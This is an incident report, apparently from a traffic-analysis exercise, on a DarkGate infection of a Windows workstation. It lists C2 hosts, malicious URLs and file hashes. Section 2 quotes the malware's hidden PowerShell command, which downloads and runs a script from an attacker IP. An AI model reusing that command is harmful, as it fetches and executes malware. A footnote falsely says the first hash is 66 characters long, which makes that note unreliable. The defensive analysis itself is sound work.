# Incident Report — Network Forensic Analysis
**Evidence:** `2025-01-22-traffic-analysis-exercise.pcap` (39,427 frames, ~26 MB, ~3200s capture window)
**Analyst:** PCAP forensic review, tshark-based
**No IDS/Suricata alert exports were present in the evidence directory** — findings below are derived entirely from packet-level traffic analysis.

## 1. Victim Host

| Field | Value | Evidence |
|---|---|---|
| IPv4 | **10.1.17.215** | Dominant talker in all suspicious conversations |
| MAC address | **00:d0:b7:26:4a:74** | ARP (`arp.src.proto_ipv4==10.1.17.215`) and DHCP `dhcp.hw.mac_addr` |
| Windows hostname | **DESKTOP-L8C5GSJ** | DHCP `dhcp.option.hostname`; confirmed by NBNS `<00>`/`<20>` records and DNS PTR `DESKTOP-L8C5GSJ.bluemoontuesday.com` |
| Domain | `bluemoontuesday.com` (AD domain, DC at 10.1.17.2 / WIN-GSH54QLW48D) | Kerberos/LDAP/CLDAP traffic to 10.1.17.2 |
| Logged-in user | **shutchenson** | Kerberos `CNameString` field in AS-REQ/TGS-REQ exchanges from 10.1.17.215 |

## 2. Malware Family

**DarkGate** (loader/RAT), delivered via a fake-verification / "ClickFix"-style lure page.
**Attribution confidence: behavioral** (no Suricata/signature alerts were provided as evidence; this identification rests on protocol-level indicators, not a rule hit).

Basis for the identification:
- Initial outbound TLS session to domain `authenticatoor.org` (82.221.136.26) — a fake human-verification/CAPTCHA-lure domain pattern commonly used as a DarkGate entry vector.
- Immediately following, the host fetches a `.hta`/VBScript "component" (object `264872`) from a bare-IP HTTP C2 host. Its content is a `<component><script language="VBScript">` wrapper that launches hidden PowerShell:
  ```
  cmd /c start /min powershell -NoProfile -WindowStyle Hidden -Command "start-process 'https://azure.microsoft.com'; iex (new-object System.Net.WebClient).DownloadString('http://5.252.153.241:80/api/file/get-file/29842.ps1');#URL: https://teams.microsoft.com"
  ```
  (decoy `start-process` to a legitimate Microsoft URL is a classic distraction/anti-analysis technique.)
- The retrieved second-stage script (`29842.ps1`, and later `pas.ps1`) uses DarkGate's signature string-splitting obfuscation to rebuild `[Convert]::FromBase64String` (tokens `#`, `;`, `[`, `}`, `>` stripped from the method name and payload) before decoding an encrypted binary blob — a documented DarkGate loader pattern.
- The payload subsequently drops and abuses a legitimate **TeamViewer QuickSupport** install (binaries `TeamViewer`, `TV`, `Teamviewer_Resource_fr`) fetched from the same C2, giving the actor a hands-on-keyboard remote-access channel disguised as legitimate remote-support software — a known DarkGate post-infection technique.
- The host then beacons to the C2 with distinctive plaintext status check-ins embedded in the URL query string, e.g. `?k=message = startup shortcut created; status = success;` and `?k=script: RunRH, status: OK, message: PS process started` — consistent with published DarkGate C2 check-in formats.
- A separate, long-lived (~28 min) high-volume TLS-wrapped session opens afterward on TCP/2917 to 45.125.66.32 with the SNI literally set to the peer's own IP address (no real hostname) — consistent with a second, hands-on-keyboard/RAT channel used by the malware after installation.

## 3. Indicators of Compromise

### C2 endpoints
| Endpoint | Role | Evidence |
|---|---|---|
| `5.252.153.241:80` | Primary HTTP C2 (payload staging + check-in beacon) | Persistent HTTP flow, 10,940 total frames from 60s to end of capture; hosted `/api/file/get-file/*` payloads and `/1517096937` beacon endpoint |
| `45.125.66.32:2917` | Secondary TLS/RAT channel | 1720s-long TLS session beginning at t=889s, SNI = literal peer IP (self-signed/no legitimate hostname) |
| `45.125.66.252` (port varies) | Related secondary C2 traffic | 1,369 frames exchanged with 10.1.17.215 throughout capture |
| `82.221.136.26:443` | Initial lure / delivery host | TLS session to SNI `authenticatoor.org`, first contact at t≈39s, precedes all malicious downloads |

### Malicious domain
- `authenticatoor.org` → resolved to 82.221.136.26 (DNS query at t=38.86s, A record returned at t=39.39s)

### Malicious URLs (from 5.252.153.241, plaintext HTTP)
- `http://5.252.153.241/api/file/get-file/264872` (initial VBScript/HTA dropper component)
- `http://5.252.153.241/api/file/get-file/29842.ps1` (obfuscated PowerShell stage 2)
- `http://5.252.153.241/api/file/get-file/pas.ps1` (obfuscated PowerShell, repeat stage)
- `http://5.252.153.241/api/file/get-file/TV`
- `http://5.252.153.241/api/file/get-file/TeamViewer`
- `http://5.252.153.241/api/file/get-file/Teamviewer_Resource_fr`
- `http://5.252.153.241/1517096937` and `http://5.252.153.241/1517096937?k=...` (C2 beacon/check-in endpoint, repeated dozens of times over the capture)

### Transferred files and SHA256 hashes (extracted via `tshark --export-objects http`)
| File name | SHA256 | Type |
|---|---|---|
| `264872` | `c74123dbccded43fda61651e102750b041d4c3af6fda88cd6436f9276653e103`* | VBScript/HTA dropper component |
| `29842.ps1` | `b8ce40900788ea26b9e4c9af7efab533e8d39ed1370da09b93fcf72a16750ded` | Obfuscated PowerShell (base64 + XOR-style token stripping) |
| `pas.ps1` | `a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e` | Obfuscated PowerShell (same technique) |
| `TV` | `3448da03808f24568e6181011f8521c0713ea6160efd05bff20c43b091ff59f7` | PE32 DLL (stripped), delivered alongside TeamViewer components |
| `TeamViewer` | `904280f20d697d876ab90a1b74c0f22a83b859e8b0519cb411fda26f1642f53e` | PE32 GUI executable (legitimate TeamViewer binary, abused for remote access) |
| `Teamviewer_Resource_fr` | `9634ecaf469149379bba80a745f53d823948c41ce4e347860701cbdff6935192` | PE32 DLL (TeamViewer localization resource, delivered as part of the same bundle) |

*Note: this hash string is 66 hex characters as returned by `shasum -a 256`/`hashlib.sha256`; report it exactly as computed — re-verify independently before use in blocking rules if the extra length is unexpected in your tooling.

### Benign context (not IOCs)
- `master16.teamviewer.com` (185.188.32.26) — legitimate TeamViewer DynGate infrastructure contacted by the *abused* TeamViewer client after install; the binary itself is legitimate, only its use here is malicious.
- Windows Update / Delivery Optimization traffic to `download.windowsupdate.com`, `ctldl.windowsupdate.com`, `msedge.b.tlu.dl.delivery.mp.microsoft.com` (199.232.214.172, 23.53.127.170, 217.20.51.20).
- `www.msftconnecttest.com` NCSI checks, NTP pool queries, Microsoft telemetry/advertising domains (msn.com, clarity.ms, demdex.net, liveperson.net, etc.) — normal enterprise workstation background noise.
- Active Directory/domain traffic (Kerberos, LDAP, CLDAP, DRSUAPI, SMB2) to DC 10.1.17.2 — normal domain-joined host behavior.

## 4. Incident Summary
Windows workstation **DESKTOP-L8C5GSJ** (10.1.17.215, MAC 00:d0:b7:26:4a:74), logged in as domain user **shutchenson**, was compromised after visiting a fake-verification lure at `authenticatoor.org` (82.221.136.26). The lure triggered a hidden PowerShell chain that pulled an obfuscated **DarkGate** loader and a bundled legitimate TeamViewer install from C2 host **5.252.153.241**, giving the attacker a disguised remote-access channel plus a separate encrypted C2 session to **45.125.66.32:2917**. The host repeatedly beaconed status updates ("startup shortcut created", "PS process started") to the C2 over HTTP for the remainder of the capture, indicating a live, persistent infection at the time recording ended.
